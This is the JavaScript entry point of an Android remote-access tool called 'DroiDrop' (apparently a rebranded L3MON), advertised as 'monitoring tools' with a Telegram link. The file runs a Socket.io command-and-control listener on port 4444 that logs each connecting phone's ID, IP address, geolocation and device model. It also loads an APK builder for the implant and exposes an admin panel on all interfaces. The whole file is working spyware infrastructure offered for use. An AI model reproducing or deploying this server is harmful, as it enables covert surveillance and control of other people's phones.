/* 
*   DroiDrop
*   An Android Monitoring Tools
*   By t.me/efxtv
*/


const
    express = require('express'),
    app = express(),
    IO = require('socket.io'),
    geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db),
    apkBuilder = require('./includes/apkBuilder');

console.log('Initializing L3MON...');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// spin up socket server
let client_io = IO(4444);

console.log('Socket.io server listening on port 4444');

client_io.on('connection', (socket) => {
    console.log('New connection attempt from:', socket.handshake.address);
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.socket.remoteAddress;

    let clientIP = clientAddress.includes(':') ? clientAddress.substring(clientAddress.lastIndexOf(':') + 1) : clientAddress;
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}
    
    console.log('Client connected:', clientParams.id, 'from IP:', clientIP);

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);    // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      // additional call to catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }

});


// get the admin interface online
const server = app.listen(8080, '0.0.0.0', () => {
    console.log('L3MON Server started on port 8080');
    console.log('Admin interface: http://0.0.0.0:8080');
});

/* 
*   
*   
*   t.me/efxtv
*/

app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));

// Error handler for malformed JSON requests
app.use((err, req, res, next) => {
    if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
        console.log('Malformed JSON request from', req.ip);
        return res.status(400).json({ error: 'Invalid JSON' });
    }
    next(err);
});
